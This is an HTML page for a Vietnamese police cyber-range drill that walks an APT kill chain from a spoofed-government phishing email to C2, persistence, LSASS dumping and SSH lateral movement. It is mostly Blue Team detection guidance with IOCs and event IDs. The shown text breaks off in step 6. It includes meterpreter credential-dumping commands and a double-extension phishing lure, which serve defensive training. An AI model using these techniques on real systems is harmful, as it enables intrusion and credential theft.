@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Hướng Dẫn Diễn Tập — APT Kill Chain</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--border:#30363d;--text:#e6edf3;--text2:#8b949e;--red:#f85149;--blue:#58a6ff;--green:#3fb950;--yellow:#d29922;--purple:#bc8cff;--orange:#ffa657}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:0 0 60px}
+/* Header */
+#guide-header{background:linear-gradient(135deg,#0d1117,#1a1f2e);border-bottom:1px solid var(--border);padding:24px 0;position:sticky;top:0;z-index:100;backdrop-filter:blur(10px)}
+.container{max-width:960px;margin:0 auto;padding:0 24px}
+#guide-header .logo{display:flex;align-items:center;gap:12px;margin-bottom:8px}
+#guide-header h1{font-size:20px;font-weight:800}
+#guide-header .sub{font-size:13px;color:var(--text2)}
+.header-meta{display:flex;gap:16px;margin-top:12px;flex-wrap:wrap}
+.meta-badge{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text2)}
+.meta-badge span{font-weight:600;color:var(--text)}
+#header-btns{display:flex;gap:8px;margin-top:12px}
+.hbtn{padding:7px 16px;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer;border:none;text-decoration:none;display:inline-flex;align-items:center;gap:6px}
+.hbtn-primary{background:var(--blue);color:#fff}
+.hbtn-secondary{background:var(--bg3);color:var(--text2);border:1px solid var(--border)}
+.hbtn:hover{filter:brightness(1.1)}
+/* TOC */
+#toc{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:18px;margin:24px 0;display:flex;flex-wrap:wrap;gap:6px}
+#toc h3{width:100%;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--text2);margin-bottom:8px}
+.toc-link{padding:4px 12px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;font-size:12px;color:var(--text2);text-decoration:none;transition:all .2s}
+.toc-link:hover{background:var(--blue);color:#fff;border-color:var(--blue)}
+/* Sections */
+.guide-section{margin-bottom:40px}
+.section-header{display:flex;align-items:center;gap:12px;margin-bottom:16px}
+.section-num{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;flex-shrink:0}
+.section-header h2{font-size:17px;font-weight:700}
+.section-header .phase-label{font-size:11px;font-weight:700;padding:3px 10px;border-radius:12px;text-transform:uppercase;letter-spacing:.5px}
+/* Step cards */
+.step-card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px}
+.step-card-header{padding:14px 18px;display:flex;align-items:center;gap:12px;border-bottom:1px solid var(--border);cursor:pointer}
+.step-num{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0}
+.step-title{font-size:14px;font-weight:700;flex:1}
+.step-time{font-size:11px;color:var(--text2)}
+.step-body{padding:18px}
+/* Role blocks */
+.role-block{border-radius:8px;padding:14px;margin-bottom:12px}
+.role-block h4{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px}
+.role-red{background:rgba(248,81,73,.06);border:1px solid rgba(248,81,73,.2)}
+.role-red h4{color:var(--red)}
+.role-blue{background:rgba(88,166,255,.06);border:1px solid rgba(88,166,255,.2)}
+.role-blue h4{color:var(--blue)}
+.role-both{background:var(--bg3);border:1px solid var(--border)}
+.role-both h4{color:var(--yellow)}
+/* Action lists */
+.action-list{list-style:none;display:flex;flex-direction:column;gap:6px}
+.action-list li{font-size:13px;color:var(--text2);padding:6px 10px;background:rgba(255,255,255,.02);border-radius:6px;border-left:3px solid transparent;line-height:1.6}
+.action-list li.red{border-left-color:var(--red)}
+.action-list li.blue{border-left-color:var(--blue)}
+.action-list li.green{border-left-color:var(--green);color:var(--text)}
+.action-list li b{color:var(--text);font-weight:600}
+/* Terminal blocks */
+.term-block{background:#0c0c0c;border:1px solid #2d2d2d;border-radius:8px;overflow:hidden;margin:8px 0}
+.term-header{background:#1a1a1a;padding:6px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #2d2d2d}
+.term-header span{font-size:11px;color:#666}
+.term-machine{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;padding:2px 8px;border-radius:8px}
+.tm-client{background:rgba(248,81,73,.15);color:var(--red)}
+.tm-web{background:rgba(88,166,255,.15);color:var(--blue)}
+.tm-db{background:rgba(63,185,80,.15);color:var(--green)}
+.term-body{padding:12px 14px;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.8}
+.tp{color:#4ec9b0}.tc{color:#fff}.to{color:#888}.th{color:var(--red);font-weight:600}.tg{color:var(--green)}.tw{color:var(--yellow)}
+/* IOC table */
+.ioc-table{width:100%;border-collapse:collapse;font-size:12px;margin:8px 0}
+.ioc-table th{background:var(--bg3);padding:8px 12px;text-align:left;font-weight:700;color:var(--text2);font-size:11px;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid var(--border)}
+.ioc-table td{padding:7px 12px;border-bottom:1px solid var(--border);color:var(--text2);vertical-align:top;line-height:1.6}
+.ioc-table td:first-child{color:var(--yellow);font-family:'JetBrains Mono',monospace;font-size:11px;white-space:nowrap}
+.ioc-table tr:last-child td{border-bottom:none}
+/* Warning/Info boxes */
+.warn-box{background:rgba(210,153,34,.07);border:1px solid rgba(210,153,34,.3);border-radius:8px;padding:12px 14px;font-size:12.5px;color:var(--text2);line-height:1.7;margin:8px 0}
+.warn-box b{color:var(--yellow)}
+.info-box{background:rgba(88,166,255,.06);border:1px solid rgba(88,166,255,.2);border-radius:8px;padding:12px 14px;font-size:12.5px;color:var(--text2);line-height:1.7;margin:8px 0}
+.info-box b{color:var(--blue)}
+.success-box{background:rgba(63,185,80,.06);border:1px solid rgba(63,185,80,.2);border-radius:8px;padding:12px 14px;font-size:12.5px;color:var(--text2);line-height:1.7;margin:8px 0}
+.success-box b{color:var(--green)}
+/* Defense table */
+.def-row{display:flex;gap:12px;margin-bottom:8px;align-items:flex-start;padding:10px;background:var(--bg3);border-radius:6px}
+.def-icon{font-size:20px;flex-shrink:0;width:32px;text-align:center}
+.def-body{flex:1}
+.def-title{font-size:12px;font-weight:700;color:var(--text);margin-bottom:3px}
+.def-text{font-size:12px;color:var(--text2);line-height:1.6}
+/* Summary table */
+.summary-table{width:100%;border-collapse:collapse;font-size:12px;background:var(--bg2);border-radius:10px;overflow:hidden;border:1px solid var(--border)}
+.summary-table th{background:var(--bg3);padding:10px 14px;text-align:left;font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:.5px;color:var(--text2)}
+.summary-table td{padding:9px 14px;border-bottom:1px solid var(--border);font-size:12px;vertical-align:top;line-height:1.5}
+.summary-table tr:last-child td{border-bottom:none}
+.summary-table td:nth-child(3){font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text2)}
+.summary-table td code{background:var(--bg3);padding:1px 6px;border-radius:3px;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--orange)}
+/* Print */
+@media print{
+  body{background:#fff;color:#000;padding:0}
+  #guide-header{position:relative;background:#fff;border-bottom:2px solid #333}
+  #guide-header h1{color:#000}
+  #header-btns{display:none}
+  .step-card{break-inside:avoid;border:1px solid #ccc}
+  .term-block{background:#f5f5f5;border:1px solid #ddd}
+  .tp{color:#006060}.tc{color:#000}.to{color:#555}.th{color:red}.tg{color:green}
+  .role-red,.role-blue,.role-both{background:#f9f9f9;border:1px solid #ddd}
+  #toc{display:none}
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div id="guide-header">
+  <div class="container">
+    <div class="logo">
+      <span style="font-size:28px">🛡️</span>
+      <div>
+        <h1>Hướng Dẫn Diễn Tập An Ninh Mạng</h1>
+        <div class="sub">Kịch bản A — APT Kill Chain (9 bước) | Phòng An ninh mạng & PCTP — Công an tỉnh Quảng Ninh</div>
+      </div>
+    </div>
+    <div class="header-meta">
+      <div class="meta-badge">📋 Kịch bản: <span>APT Phishing → Lateral Movement → Exfiltration</span></div>
+      <div class="meta-badge">⏱️ Thời lượng: <span>45–60 phút</span></div>
+      <div class="meta-badge">👥 Vai: <span>Red Team + Blue Team</span></div>
+      <div class="meta-badge">🖥️ Máy: <span>CLIENT · WEB-SERVER · DB-SERVER</span></div>
+    </div>
+    <div id="header-btns">
+      <a href="drill.html" class="hbtn hbtn-primary">▶ Vào Diễn Tập</a>
+      <button class="hbtn hbtn-secondary" onclick="window.print()">🖨️ In tài liệu</button>
+      <a href="index.html" class="hbtn hbtn-secondary">← Menu chính</a>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+
+<!-- TOC -->
+<div id="toc">
+  <h3>Mục lục nhanh</h3>
+  <a class="toc-link" href="#overview">Tổng quan</a>
+  <a class="toc-link" href="#step1">1. Phishing Email</a>
+  <a class="toc-link" href="#step2">2. Execution</a>
+  <a class="toc-link" href="#step3">3. Persistence</a>
+  <a class="toc-link" href="#step4">4. Credential Dump</a>
+  <a class="toc-link" href="#step5">5. Network Scan</a>
+  <a class="toc-link" href="#step6">6. Lateral Movement</a>
+  <a class="toc-link" href="#step7">7. Webshell</a>
+  <a class="toc-link" href="#step8">8. Exfiltration</a>
+  <a class="toc-link" href="#step9">9. Cover Tracks</a>
+  <a class="toc-link" href="#defense">Phòng thủ</a>
+  <a class="toc-link" href="#summary">Bảng tóm tắt</a>
+</div>
+
+<!-- OVERVIEW -->
+<div class="guide-section" id="overview">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(88,166,255,.15);color:var(--blue)">📌</div>
+    <h2>Tổng quan kịch bản</h2>
+  </div>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-bottom:16px">
+    <div style="background:rgba(248,81,73,.06);border:1px solid rgba(248,81,73,.2);border-radius:8px;padding:14px">
+      <div style="font-size:11px;font-weight:700;color:var(--red);text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px">CLIENT-PC</div>
+      <div style="font-size:12px;color:var(--text2);line-height:1.7">IP: 192.168.1.100<br>OS: Windows 10 Pro<br>User: nhanvien01<br><b style="color:var(--red)">Điểm xâm nhập ban đầu</b></div>
+    </div>
+    <div style="background:rgba(88,166,255,.06);border:1px solid rgba(88,166,255,.2);border-radius:8px;padding:14px">
+      <div style="font-size:11px;font-weight:700;color:var(--blue);text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px">WEB-SERVER</div>
+      <div style="font-size:12px;color:var(--text2);line-height:1.7">IP: 192.168.1.10<br>OS: Ubuntu 22.04<br>Services: Apache2, PHP<br><b style="color:var(--blue)">Mục tiêu lateral movement</b></div>
+    </div>
+    <div style="background:rgba(63,185,80,.06);border:1px solid rgba(63,185,80,.2);border-radius:8px;padding:14px">
+      <div style="font-size:11px;font-weight:700;color:var(--green);text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px">DB-SERVER</div>
+      <div style="font-size:12px;color:var(--text2);line-height:1.7">IP: 192.168.1.20<br>OS: Ubuntu 22.04<br>Services: MySQL 8.0<br><b style="color:var(--green)">Mục tiêu exfiltration</b></div>
+    </div>
+  </div>
+
+  <div class="info-box">
+    <b>Mục tiêu học tập:</b> Hiểu toàn bộ chuỗi tấn công APT từ phishing đến data exfiltration. Mỗi bước đều có góc nhìn <b style="color:var(--red)">Red Team</b> (kỹ thuật tấn công) và <b style="color:var(--blue)">Blue Team</b> (phát hiện & phản ứng).
+  </div>
+
+  <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:12px">
+    <span style="background:rgba(248,81,73,.12);color:var(--red);border:1px solid rgba(248,81,73,.3);border-radius:4px;padding:3px 10px;font-size:11px;font-weight:600">1. INITIAL ACCESS</span>
+    <span style="font-size:14px;color:var(--text2)">→</span>
+    <span style="background:rgba(248,81,73,.12);color:var(--red);border:1px solid rgba(248,81,73,.3);border-radius:4px;padding:3px 10px;font-size:11px;font-weight:600">2. EXECUTION</span>
+    <span style="font-size:14px;color:var(--text2)">→</span>
+    <span style="background:rgba(210,153,34,.12);color:var(--yellow);border:1px solid rgba(210,153,34,.3);border-radius:4px;padding:3px 10px;font-size:11px;font-weight:600">3. PERSISTENCE</span>
+    <span style="font-size:14px;color:var(--text2)">→</span>
+    <span style="background:rgba(210,153,34,.12);color:var(--yellow);border:1px solid rgba(210,153,34,.3);border-radius:4px;padding:3px 10px;font-size:11px;font-weight:600">4. CREDENTIAL ACCESS</span>
+    <span style="font-size:14px;color:var(--text2)">→</span>
+    <span style="background:rgba(188,140,255,.12);color:var(--purple);border:1px solid rgba(188,140,255,.3);border-radius:4px;padding:3px 10px;font-size:11px;font-weight:600">5. DISCOVERY</span>
+    <span style="font-size:14px;color:var(--text2)">→</span>
+    <span style="background:rgba(255,166,87,.12);color:var(--orange);border:1px solid rgba(255,166,87,.3);border-radius:4px;padding:3px 10px;font-size:11px;font-weight:600">6–7. LATERAL / COLLECTION</span>
+    <span style="font-size:14px;color:var(--text2)">→</span>
+    <span style="background:rgba(88,166,255,.12);color:var(--blue);border:1px solid rgba(88,166,255,.3);border-radius:4px;padding:3px 10px;font-size:11px;font-weight:600">8. EXFILTRATION</span>
+    <span style="font-size:14px;color:var(--text2)">→</span>
+    <span style="background:rgba(139,148,158,.12);color:var(--text2);border:1px solid rgba(139,148,158,.3);border-radius:4px;padding:3px 10px;font-size:11px;font-weight:600">9. COVER TRACKS</span>
+  </div>
+</div>
+
+<!-- STEP 1 -->
+<div class="guide-section" id="step1">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(248,81,73,.15);color:var(--red)">1</div>
+    <div>
+      <h2>Phishing Email — Giả mạo UBND tỉnh</h2>
+      <span class="phase-label" style="background:rgba(248,81,73,.12);color:var(--red)">INITIAL ACCESS · T1566.001 · T+0:00</span>
+    </div>
+  </div>
+
+  <div class="step-card">
+    <div class="step-card-header">
+      <div class="step-num" style="background:rgba(248,81,73,.15);color:var(--red)">🔴</div>
+      <div class="step-title">Thao tác diễn tập</div>
+    </div>
+    <div class="step-body">
+      <div class="role-block role-both">
+        <h4>📋 Hành động cần thực hiện (CLIENT-PC)</h4>
+        <ul class="action-list">
+          <li class="green">1. Chọn máy <b>CLIENT-PC</b> từ sidebar trái → tab <b>Màn hình</b></li>
+          <li class="green">2. <b>Double-click icon Outlook</b> trên desktop để mở email client</li>
+          <li class="green">3. Trong hộp thư đến: nhấp vào email từ <b>"UBND Quảng Ninh"</b> (có dấu ⚠ đỏ, đính kèm file)</li>
+          <li class="green">4. Đọc nội dung email — <b>chú ý địa chỉ người gửi</b> và loại file đính kèm</li>
+          <li class="blue">5. Chuyển tab <b>Logs → System</b> để xem nhật ký email gateway (bước Blue Team)</li>
+        </ul>
+      </div>
+
+      <div class="role-block role-red">
+        <h4>🔴 Red Team — Kỹ thuật tấn công</h4>
+        <div style="font-size:13px;color:var(--text2);line-height:1.7">
+          Kẻ tấn công đăng ký domain <code style="background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--orange)">ubnd-tinhquangninh.info</code> (domain giả, mới đăng ký 1 ngày). Soạn email spear-phishing nhắm mục tiêu cụ thể với nội dung liên quan đến công việc thực tế (báo cáo tài chính UBND). File đính kèm dùng <b>double extension</b>: <code style="background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--orange)">.pdf.exe</code> — Windows ẩn đuôi <code>.exe</code>, nạn nhân thấy file trông giống PDF.
+        </div>
+      </div>
+
+      <div class="role-block role-blue">
+        <h4>🔵 Blue Team — Phát hiện & Phân tích</h4>
+        <ul class="action-list">
+          <li class="blue"><b>Kiểm tra domain người gửi:</b> ubnd-tinhquangninh<b>.info</b> ≠ quangninh<b>.gov.vn</b></li>
+          <li class="blue"><b>SPF/DKIM check:</b> Domain mới (1 ngày tuổi), SPF FAIL, DKIM absent</li>
+          <li class="blue"><b>File attachment:</b> .exe bị ngụy trang — email gateway nên block loại file này</li>
+          <li class="blue"><b>Lệnh kiểm tra (Security team):</b></li>
+        </ul>
+        <div class="term-block">
+          <div class="term-header"><div class="term-machine tm-client">CLIENT</div><span>Email header analysis</span></div>
+          <div class="term-body">
+            <div class="to"># Kiểm tra header email trong Outlook: File → Properties → Internet headers</div>
+            <div class="to"># Hoặc dùng tool online: mxtoolbox.com/EmailHeaders.aspx</div>
+            <div class="tw">Received-SPF: Fail (domain of ubnd-tinhquangninh.info)</div>
+            <div class="tw">DKIM-Signature: (none)</div>
+            <div class="th">X-Mailer: Kali Linux / Gophish v0.12.1</div>
+            <div class="to"># Đây là dấu hiệu email được gửi bằng công cụ phishing framework!</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="warn-box">
+        <b>⚠ Dấu hiệu nhận biết:</b> (1) Domain không kết thúc .gov.vn; (2) File .exe đính kèm trong email công vụ; (3) Nội dung tạo cảm giác KHẨN CẤP với thời hạn 16:00; (4) SPF FAIL khi kiểm tra header
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 2 -->
+<div class="guide-section" id="step2">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(248,81,73,.15);color:var(--red)">2</div>
+    <div>
+      <h2>Execution — Malware thực thi, kết nối C2</h2>
+      <span class="phase-label" style="background:rgba(248,81,73,.12);color:var(--red)">EXECUTION · T1059 · T+0:08</span>
+    </div>
+  </div>
+  <div class="step-card">
+    <div class="step-card-header">
+      <div class="step-num" style="background:rgba(248,81,73,.15);color:var(--red)">🔴</div>
+      <div class="step-title">Thao tác diễn tập</div>
+    </div>
+    <div class="step-body">
+      <div class="role-block role-both">
+        <h4>📋 Hành động cần thực hiện</h4>
+        <ul class="action-list">
+          <li class="green">1. Nhấp vào file đính kèm <b>BaoCaoTaiChinh_Q1-2024.pdf.exe</b> trong email → chọn <b>Tải về</b></li>
+          <li class="green">2. Thanh tải xuống hiện ra → nhấp <b>"Mở file"</b></li>
+          <li class="green">3. Cửa sổ SmartScreen cảnh báo hiện ra — <b>đọc kỹ cảnh báo!</b> Trong diễn tập: nhấp <b>"Chạy dù sao"</b></li>
+          <li class="green">4. File PDF giả mở ra (decoy) — người dùng nghĩ là tài liệu thật</li>
+          <li class="blue">5. Mở <b>Task Manager</b> (double-click icon) → quan sát tiến trình mới <b>svchost32.exe</b></li>
+          <li class="blue">6. Chuyển tab <b>Terminal → gõ lệnh:</b></li>
+        </ul>
+      </div>
+
+      <div class="term-block">
+        <div class="term-header"><div class="term-machine tm-client">CLIENT-PC · cmd.exe</div></div>
+        <div class="term-body">
+          <div><span class="tp">C:\Users\nhanvien01&gt; </span><span class="tc">tasklist</span></div>
+          <div class="to">Image Name          PID    CPU   Mem Usage</div>
+          <div class="to">svchost.exe         892    0.0   18,432K</div>
+          <div class="to">explorer.exe        2841   0.1   45,120K</div>
+          <div class="th">*** svchost32.exe   4821   3.4   24,576K  &lt;-- ĐÂY LÀ MALWARE</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">C:\Users\nhanvien01&gt; </span><span class="tc">netstat -an</span></div>
+          <div class="to">Proto  Local Address          Foreign Address        State</div>
+          <div class="th">TCP    192.168.1.100:49832    45.134.212.77:4444     ESTABLISHED</div>
+          <div class="tg">^ Kết nối C2 của kẻ tấn công! Port 4444 = Metasploit meterpreter</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">C:\Users\nhanvien01&gt; </span><span class="tc">dir %TEMP%\svchost32.exe</span></div>
+          <div class="th">10/04/2024 09:46    87,552 svchost32.exe  &lt;-- File trong %TEMP% là bất thường!</div>
+        </div>
+      </div>
+
+      <div class="role-block role-blue">
+        <h4>🔵 Blue Team — Phân tích IOC</h4>
+        <table class="ioc-table">
+          <tr><th>Chỉ số (IOC)</th><th>Giá trị</th><th>Ý nghĩa</th></tr>
+          <tr><td>Process name</td><td>svchost32.exe</td><td>svchost.exe thật KHÔNG có "32"</td></tr>
+          <tr><td>Process path</td><td>%TEMP%\svchost32.exe</td><td>Hệ thống: C:\Windows\System32</td></tr>
+          <tr><td>Parent process</td><td>explorer.exe</td><td>svchost.exe thật được spawn bởi services.exe</td></tr>
+          <tr><td>Outbound TCP</td><td>45.134.212.77:4444</td><td>Port 4444 = Metasploit C2 mặc định</td></tr>
+          <tr><td>EventID</td><td>4688</td><td>Process creation — suspicious executable from %TEMP%</td></tr>
+        </table>
+      </div>
+
+      <div class="success-box">
+        <b>✅ Nhận xét kỹ thuật:</b> Malware dùng kỹ thuật <b>process masquerading</b> — đặt tên gần giống tiến trình hệ thống (svchost) để tránh bị phát hiện. File nằm trong %TEMP% (thay vì System32) và kết nối port 4444 là hai dấu hiệu đặc trưng của RAT/Meterpreter.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 3 -->
+<div class="guide-section" id="step3">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(210,153,34,.15);color:var(--yellow)">3</div>
+    <div>
+      <h2>Persistence — Registry & Scheduled Task</h2>
+      <span class="phase-label" style="background:rgba(210,153,34,.12);color:var(--yellow)">PERSISTENCE · T1547.001 + T1053.005 · T+0:12</span>
+    </div>
+  </div>
+  <div class="step-card">
+    <div class="step-card-header">
+      <div class="step-num" style="background:rgba(210,153,34,.15);color:var(--yellow)">3</div>
+      <div class="step-title">Thao tác diễn tập</div>
+    </div>
+    <div class="step-body">
+      <div class="term-block">
+        <div class="term-header"><div class="term-machine tm-client">CLIENT-PC · cmd.exe</div><span>Kiểm tra persistence</span></div>
+        <div class="term-body">
+          <div><span class="tp">C:\Users\nhanvien01&gt; </span><span class="tc">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span></div>
+          <div class="to">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</div>
+          <div class="to">    SecurityHealth    REG_SZ    %windir%\system32\SecurityHealthSystray.exe</div>
+          <div class="th">*** WindowsDefend32 REG_SZ    C:\Users\NHVIEN~1\AppData\Local\Temp\svchost32.exe</div>
+          <div class="tg">^ Registry Run key giả — chạy malware mỗi khi Windows khởi động!</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">C:\Users\nhanvien01&gt; </span><span class="tc">schtasks /query /fo LIST | findstr "TaskName\|Status\|Run"</span></div>
+          <div class="to">TaskName:   \Microsoft\Windows\UpdateAssistant\Assistant</div>
+          <div class="th">Run As User: SYSTEM</div>
+          <div class="th">Status:     Ready (triggers every 5 minutes)</div>
+          <div class="tg">^ Scheduled Task giả — tự restart malware mỗi 5 phút nếu bị kill!</div>
+        </div>
+      </div>
+
+      <div class="role-block role-blue">
+        <h4>🔵 Phản ứng Blue Team</h4>
+        <ul class="action-list">
+          <li class="blue"><b>EventID 4657:</b> HKLM\...\Run registry value được SET — do svchost32.exe (PID 4821)</li>
+          <li class="blue"><b>EventID 4698:</b> Scheduled task mới tạo — creator: svchost32.exe (bất thường)</li>
+          <li class="blue"><b>Khắc phục:</b> <code style="background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--orange)">reg delete HKLM\...\Run\WindowsDefend32 /f</code> và <code style="background:var(--bg3);padding:1px 5px;border-radius:3px;color:var(--orange)">schtasks /delete /tn "\Microsoft\Windows\UpdateAssistant\Assistant" /f</code></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 4 -->
+<div class="guide-section" id="step4">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(210,153,34,.15);color:var(--yellow)">4</div>
+    <div>
+      <h2>Credential Access — Dump LSASS Memory</h2>
+      <span class="phase-label" style="background:rgba(210,153,34,.12);color:var(--yellow)">CREDENTIAL ACCESS · T1003.001 · T+0:18</span>
+    </div>
+  </div>
+  <div class="step-card">
+    <div class="step-card-header">
+      <div class="step-num" style="background:rgba(210,153,34,.15);color:var(--yellow)">4</div>
+      <div class="step-title">Thao tác diễn tập</div>
+    </div>
+    <div class="step-body">
+      <div class="role-block role-red">
+        <h4>🔴 Kỹ thuật Mimikatz — LSASS Dump</h4>
+        <div class="term-block">
+          <div class="term-header"><div class="term-machine tm-client">CLIENT-PC · Malware C2 shell</div><span>Red Team — Credential dumping</span></div>
+          <div class="term-body">
+            <div class="to"># Từ C2 session (kẻ tấn công thực hiện qua meterpreter/cobalt strike)</div>
+            <div><span class="tp">meterpreter&gt; </span><span class="tc">getsystem</span></div>
+            <div class="tg">...got system via technique 1 (Named Pipe Impersonation)</div>
+            <div><span class="tp">meterpreter&gt; </span><span class="tc">load kiwi</span></div>
+            <div><span class="tp">meterpreter&gt; </span><span class="tc">creds_msv</span></div>
+            <div class="to">Username   Domain  NTLM Hash</div>
+            <div class="th">nhanvien01 CORP    a3b4c5d6e7f8...  (P@ssw0rd2024!)</div>
+            <div class="th">adminIT    CORP    1a2b3c4d5e6f...  (Adm1n@Corp2024) &lt;-- DOMAIN ADMIN!</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="role-block role-blue">
+        <h4>🔵 Phát hiện qua Event Log (Blue Team)</h4>
+        <div class="term-block">
+          <div class="term-header"><div class="term-machine tm-client">CLIENT-PC</div><span>Tìm kiếm EventID 4662 trong Event Viewer</span></div>
+          <div class="term-body">
+            <div><span class="tp">C:\Users\nhanvien01&gt; </span><span class="tc">wevtutil qe Security /q:"*[EventData[Data[@Name='ProcessName'] and (Data='%TEMP%\svchost32.exe')]]" /f:text /c:5</span></div>
+            <div class="to">Date:    10/04/2024 10:18:44</div>
+            <div class="to">EventID: 4662 — An operation was performed on an object</div>
+            <div class="th">Object:  lsass.exe (Local Security Authority Process)</div>
+            <div class="th">Access:  PROCESS_VM_READ (0x1010)</div>
+            <div class="th">Actor:   svchost32.exe (PID 4821)</div>
+            <div class="tg"># Sysmon Event 10 cũng ghi nhận: ProcessAccess to lsass.exe</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="warn-box">
+        <b>⚠ Tầm quan trọng:</b> Với username và password của <b>adminIT</b> (domain admin), kẻ tấn công có thể đăng nhập vào bất kỳ máy nào trong mạng nội bộ qua SSH/RDP/SMB. Đây là bước khiến toàn bộ mạng bị ảnh hưởng.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 5 -->
+<div class="guide-section" id="step5">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(188,140,255,.15);color:var(--purple)">5</div>
+    <div>
+      <h2>Discovery — Quét mạng nội bộ</h2>
+      <span class="phase-label" style="background:rgba(188,140,255,.12);color:var(--purple)">DISCOVERY · T1046 · T+0:25</span>
+    </div>
+  </div>
+  <div class="step-card">
+    <div class="step-body">
+      <div class="term-block">
+        <div class="term-header"><div class="term-machine tm-client">CLIENT-PC · Terminal</div><span>Quan sát network scan</span></div>
+        <div class="term-body">
+          <div><span class="tp">C:\Users\nhanvien01&gt; </span><span class="tc">netstat -an | findstr ESTABLISHED</span></div>
+          <div class="th">TCP 192.168.1.100:50001  192.168.1.10:22   TIME_WAIT</div>
+          <div class="th">TCP 192.168.1.100:50010  192.168.1.10:80   TIME_WAIT</div>
+          <div class="th">TCP 192.168.1.100:50021  192.168.1.20:3306 TIME_WAIT</div>
+          <div class="tg"># Malware đang scan các cổng trên mạng nội bộ!</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">C:\Users\nhanvien01&gt; </span><span class="tc">ipconfig</span></div>
+          <div class="to">IPv4 Address: 192.168.1.100</div>
+          <div class="to">Subnet Mask:  255.255.255.0   (→ range: 192.168.1.1–254)</div>
+          <div class="tg"># Malware quét toàn bộ /24 subnet này trong ~3 giây</div>
+        </div>
+      </div>
+      <div class="role-block role-blue">
+        <h4>🔵 Blue Team — IDS Alert</h4>
+        <ul class="action-list">
+          <li class="blue">IDS Rule: <b>TCP SYN flood</b> từ .100 đến .0/24 trong &lt; 5 giây → severity HIGH</li>
+          <li class="blue">Xem tab <b>Logs → Network/IDS</b> trong drill để quan sát alert này</li>
+          <li class="blue">Hành động: <b>Isolate</b> machine 192.168.1.100 khỏi mạng ngay lập tức</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 6 -->
+<div class="guide-section" id="step6">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(255,166,87,.15);color:var(--orange)">6</div>
+    <div>
+      <h2>Lateral Movement — SSH vào Web Server</h2>
+      <span class="phase-label" style="background:rgba(255,166,87,.12);color:var(--orange)">LATERAL MOVEMENT · T1021.004 · T+0:38</span>
+    </div>
+  </div>
+  <div class="step-card">
+    <div class="step-body">
+      <div style="font-size:12px;color:var(--text2);margin-bottom:12px">⚠ Chuyển sang máy <b>WEB-SERVER</b> để quan sát từ góc nhìn server</div>
+      <div class="term-block">
+        <div class="term-header"><div class="term-machine tm-web">WEB-SERVER · /var/log/auth.log</div><span>Blue Team — Phát hiện SSH bất thường</span></div>
+        <div class="term-body">
+          <div><span class="tp">adminIT@web-server:~$ </span><span class="tc">last</span></div>
+          <div class="th">adminIT  pts/1  192.168.1.100  Wed Apr 10 10:38  still logged in  ← ALERT!</div>
+          <div class="to">adminIT  pts/0  192.168.1.5    Mon Apr  8 08:01 - 18:22</div>
+          <div class="tg"># Bất thường: adminIT đăng nhập từ .100 (client PC nhân viên) thay vì .5 (admin PC)</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">adminIT@web-server:~$ </span><span class="tc">who</span></div>
+          <div class="th">adminIT  pts/1  Apr 10 10:38 (192.168.1.100)  ← nguồn IP bất thường!</div>
+          <div style="margin-top:8px"></div>
+          <div><span class="tp">adminIT@web-server:~$ </span><span class="tc">ps aux | grep -v grep</span></div>
